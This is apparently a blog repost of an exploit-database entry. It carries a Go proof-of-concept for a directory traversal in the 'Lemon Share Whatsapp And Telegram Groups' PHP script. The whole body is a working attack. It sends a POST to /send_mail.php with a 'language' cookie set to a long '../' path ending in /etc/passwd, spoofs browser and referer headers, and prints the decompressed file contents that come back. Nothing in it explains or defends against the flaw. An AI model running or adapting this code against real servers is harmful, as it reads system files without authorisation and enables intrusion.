---
layout: post
title: Lemon Share Whatsapp And Telegram Groups - Directory Traversal
date: 2023-08-12
category: exploit
---

# Exploit Title: Lemon Share Whatsapp And Telegram Groups - Directory Traversal
# Exploit Author: Ahmet Ümit BAYRAM
# Date: 2023-08-12
# Vendor: https://www.codester.com/items/44316/lemon-share-whatsapp-and-telegram-groups
# Tested on: Kali Linux & MacOS
# CVE: N/A

```go
package main

import (
	"bytes"
	"compress/gzip"
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
)

func main() {
	var url string
	defaultURL := "http://localhost"
	fmt.Print("Please enter the URL (Default: http://localhost): ")

	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		input := scanner.Text()
		if input != "" {
			url = input
		} else {
			url = defaultURL
		}
	}

	payload := "../../../../../../../../../../../../../../etc/passwd"
	requestBody := []byte{}

	request, err := http.NewRequest("POST", url+"/send_mail.php", bytes.NewBuffer(requestBody))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	request.Header.Add("Host", url)
	request.Header.Add("Referer", "https://www.google.com/search?hl=en&q=testing")
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
	request.Header.Add("Cookie", "acceptCookies=true; language="+payload)
	request.Header.Add("Content-Length", "0")
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	request.Header.Add("Accept-Encoding", "gzip,deflate,br")
	request.Header.Add("Connection", "Keep-alive")

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer response.Body.Close()

	fmt.Println("Request status code:", response.Status)

	// Read and print the response body
	buf := new(bytes.Buffer)
	_, err = io.Copy(buf, response.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}

	// Gzip decompression
	var decodedBuf bytes.Buffer
	reader, err := gzip.NewReader(buf)
	if err != nil {
		fmt.Println("Error creating gzip reader:", err)
		return
	}

	_, err = io.Copy(&decodedBuf, reader)
	if err != nil {
		fmt.Println("Error decoding gzip:", err)
		return
	}

	fmt.Println("Decoded response:", decodedBuf.String())
}
